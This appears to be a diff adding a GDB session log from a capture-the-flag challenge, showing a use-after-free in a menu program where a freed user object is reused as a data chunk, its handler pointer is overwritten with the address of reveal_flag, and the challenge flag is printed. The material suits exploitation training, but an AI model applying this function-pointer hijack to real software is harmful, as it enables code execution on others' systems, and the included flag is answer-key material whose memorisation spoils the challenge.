@@ -1,0 +1,62 @@
+  
+  This GDB supports auto-downloading debuginfo from the following URLs:
+    <https://debuginfod.archlinux.org>
+    <https://debuginfod.cachyos.org>
+  Enable debuginfod for this session? (y or [n]) [answered N; input not from terminal]
+  Debuginfod has been disabled.
+  To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
+  Breakpoint 1 at 0x14ae
+  [Thread debugging using libthread_db enabled]
+  Using host libthread_db library "/usr/lib/libthread_db.so.1".
+  
+  Breakpoint 1, 0x00005555555554ae in show_user ()
+  
+  === At show_user entry (stale object reused) ===
+  &g_user (global ptr)   = 0x555555558080
+  g_user (dangling)      = 0x55555555b030
+  g_data (reused chunk)  = 0x55555555b030
+  g_user == g_data ?     = 1
+  *(g_user+0x20) handler = 0x555555555213
+  address of reveal_flag = 0x555555555213
+  chunk bytes [0..0x28)  =
+  0x55555555b030:	0x41	0x41	0x41	0x41	0x00	0x00	0x00	0x00
+  0x55555555b038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+  0x55555555b040:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+  0x55555555b048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+  0x55555555b050:	0x13	0x52	0x55	0x55	0x55	0x55	0x00	0x00
+  === The Matrix Reloaded ( Freed Memory ) ===
+  
+  1. Create user
+  2. Delete user
+  3. Show user
+  4. Create data
+  5. Exit
+  > Enter username: User created.
+  
+  1. Create user
+  2. Delete user
+  3. Show user
+  4. Create data
+  5. Exit
+  > User deleted.
+  
+  1. Create user
+  2. Delete user
+  3. Show user
+  4. Create data
+  5. Exit
+  > Enter data: Enter handler address (hex): Data created.
+  
+  1. Create user
+  2. Delete user
+  3. Show user
+  4. Create data
+  5. Exit
+  > Flag: KPMG_CTF{Matrix_Escaped}
+  
+  1. Create user
+  2. Delete user
+  3. Show user
+  4. Create data
+  5. Exit
+  > [Inferior 1 (process 705167) exited normally]
